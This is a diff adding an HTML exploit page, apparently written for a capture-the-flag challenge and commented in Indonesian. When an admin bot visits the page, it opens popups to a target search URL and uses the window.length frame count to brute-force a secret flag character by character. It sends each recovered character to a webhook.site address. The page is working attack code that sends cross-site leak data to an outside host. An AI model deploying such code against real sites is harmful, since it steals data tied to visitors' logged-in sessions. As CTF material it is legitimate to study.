@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Exploit</title>
+</head>
+<body>
+    <h1 id="status">Memulai Serangan...</h1>
+    <div id="logs"></div>
+
+    <script>
+        // 1. KONFIGURASI (WAJIB DIUBAH)
+        const targetBase = "https://ponder.cbd2026.cloud/search?q=";
+        const webhook = "https://webhook.site/76c1a3f4-7985-4c73-9f7d-1d28bae13e25"; 
+
+        // 2. STATE
+        let flag = "flag{"; 
+        const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_}";
+        
+        const log = (msg) => {
+            console.log(msg);
+            document.getElementById('logs').innerHTML += `<p>${msg}</p>`;
+        };
+
+        // 3. PING (Untuk memastikan bot sudah masuk ke halaman ini)
+        fetch(`${webhook}?status=bot_sampai_di_github`);
+
+        async function tryChar(char) {
+            return new Promise((resolve) => {
+                const query = flag + char;
+                const win = window.open(`${targetBase}${encodeURIComponent(query)}`);
+
+                // Tunggu sedikit lebih lama (800ms) agar halaman search benar-benar termuat
+                setTimeout(() => {
+                    try {
+                        // Jika single_match=True, maka len(matches) == 1 dan <iframe> muncul
+                        // window.length akan bernilai 1.
+                        if (win.length === 1) {
+                            win.close();
+                            resolve(true);
+                        } else {
+                            win.close();
+                            resolve(false);
+                        }
+                    } catch (e) {
+                        // Jika terjadi error (misal window sudah tertutup/blocked)
+                        win.close();
+                        resolve(false);
+                    }
+                }, 800); 
+            });
+        }
+
+        async function startBruteForce() {
+            log(`Mencari karakter setelah: ${flag}`);
+            
+            for (let char of alphabet) {
+                log(`Mencoba: ${flag}${char}`);
+                
+                const found = await tryChar(char);
+                
+                if (found) {
+                    flag += char;
+                    log(`BERHASIL: ${flag}`);
+                    
+                    // Kirim progres ke Webhook
+                    fetch(`${webhook}?found=${encodeURIComponent(flag)}`);
+
+                    if (char === "}") {
+                        log("Flag Lengkap Ditemukan!");
+                        fetch(`${webhook}?status=SELESAI&final_flag=${encodeURIComponent(flag)}`);
+                        return;
+                    }
+                    
+                    // Mulai lagi dari karakter pertama alphabet untuk posisi selanjutnya
+                    return startBruteForce();
+                }
+            }
+            log("Gagal menemukan karakter selanjutnya. Coba periksa koneksi atau timing.");
+        }
+
+        // Jalankan saat halaman dimuat
+        // Bot admin di tantangan ini biasanya mengizinkan popup secara otomatis
+        window.onload = () => {
+            startBruteForce();
+        };
+    </script>
+</body>
+</html>
